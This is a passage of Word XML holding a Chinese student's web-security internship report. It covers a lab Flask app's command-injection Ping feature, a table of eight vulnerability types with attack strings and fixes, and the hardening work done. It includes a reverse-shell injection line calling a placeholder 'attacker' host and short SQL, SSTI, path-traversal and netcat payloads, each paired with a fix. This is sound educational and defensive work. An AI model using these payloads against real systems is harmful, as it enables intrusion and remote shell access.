        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>2.8 命令注入漏洞（Day 09）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>新增Ping网络诊断功能（/ping），使用subprocess.check_output + shell=True执行系统命令，存在命令注入漏洞。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>命令注入攻击：输入127.0.0.1; whoami → 执行whoami命令；输入127.0.0.1; bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1 → 反弹Shell。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>修复方案：使用shlex.quote()对用户输入进行安全转义、shell=False禁止Shell解析、参数以列表形式传递。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>三、漏洞技术总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>经过10天系统性的学习与实践，共接触并修复了8大类Web安全漏洞。下表汇总了各类漏洞的风险等级、利用方式与修复方案：</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
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>漏洞类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>典型攻击方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>核心修复方案</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>SQL注入</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>🔴 严重</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>' OR '1'='1、union select</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>参数化查询（?占位符）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>文件上传</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>🔴 严重</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>上传PHP一句话木马</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>扩展名白名单+幻数校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>命令注入</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>🔴 严重</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>; whoami、| nc、&amp;&amp; id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>shlex.quote()+shell=False</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>SSTI模板注入</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>🔴 严重</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>{{config}}、{{7*7}}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>模板变量传递替代f-string</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>水平越权(IDOR)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>🔴 严重</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>修改user_id参数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Session获取用户身份</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>路径遍历</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>🔴 严重</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>../app.py读取源码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>白名单机制</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>🟡 中危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>恶意表单自动提交</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CSRF Token + HMAC验证</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>负值交易</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>🟠 高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>amount=-10000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>金额&gt;0校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>3.1 密码存储安全</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>从最初的明文密码存储（admin/123），到使用Werkzeug库的PBKDF2-SHA256哈希算法（600,000次迭代），实现了密码的安全存储。同时实施了强密码策略：最小12位、包含大小写字母、数字、特殊字符，并建立了常见弱密码黑名单。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>3.2 认证安全</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>登录功能集成了多层防护：CSRF令牌防止跨站请求伪造、速率限制（每分钟10次）防止暴力破解、账户锁定机制（5次失败锁定15分钟）、统一错误提示防止用户枚举。Session配置了HttpOnly（禁止JS读取）、SameSite=Lax（防止CSRF）、30分钟自动过期等安全属性。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>3.3 输入验证与数据安全</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>建立了完整的输入验证体系：用户名（3-32位字母数字）、邮箱（格式校验）、手机号（11位中国大陆手机号）的格式校验，以及sanitize_input函数对用户输入进行清理（去空格、截断长度、移除控制字符）。所有的SQL操作最终都统一使用参数化查询，从根本上杜绝了SQL注入风险。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>四、实习总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>为期10天的网络安全实践实训让我收获颇丰。从第一天的环境搭建到最后一天的命令注入修复，我完整经历了一个Web应用从开发到安全加固的全过程，对Web安全有了深入而系统的理解。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>在技术层面，我掌握了Python Flask框架的开发与安全配置，包括Session管理、CSRF防护、安全响应头设置等基础设施安全知识。通过亲手制造并修复SQL注入、文件上传、SSTI、命令注入等漏洞，我深刻理解了"攻击者思维"——每一个用户输入都可能是攻击入口，每一个业务功能都可能存在设计缺陷。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>在工具使用方面，我学会了使用FOFA进行资产收集、使用Burp Suite进行请求拦截与修改、使用curl进行自动化测试、使用Git进行版本管理。我还自主开发了SSTI漏洞扫描器，实现了从漏洞发现到利用再到修复的完整闭环。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>特别值得一提的是AI辅助开发模式。在整个实训过程中，我使用AI工具辅助编写代码、分析漏洞、生成报告，大大提高了开发效率。同时也认识到AI生成代码可能存在安全隐患，需要开发者具备安全审计能力，不能盲目信任AI输出。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>在工程管理方面，我严格执行了每日日清交付制度，每天将当天的代码推送至GitHub仓库，并更新README文档。整个项目形成了清晰的演进脉络：从Day02的基本登录功能，到Day03的注册搜索，再到Day09的Ping诊断，每次迭代都在前一版本基础上增加功能并修复漏洞。这种渐进式的项目构建方式让我体验了真实的软件开发流程。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本次实训还锻炼了我的文档编写能力。每修复一个漏洞，我都生成了对应的修复报告（Word文档），注明漏洞危害等级、漏洞位置、复现步骤和修复方案。这些报告不仅是实训成果的体现，也是日后工作中安全审计报告写作的宝贵经验。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>最后，感谢陈腾老师的悉心指导与四川讯方信息技术有限公司提供的实训平台。通过本次实训，我不仅巩固了网络安全专业知识，更培养了安全开发意识与工程化思维，为今后从事网络安全相关工作打下了坚实基础。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>实习成绩评定：</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">指导教师签名：　　　　　</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>年　　月　　日</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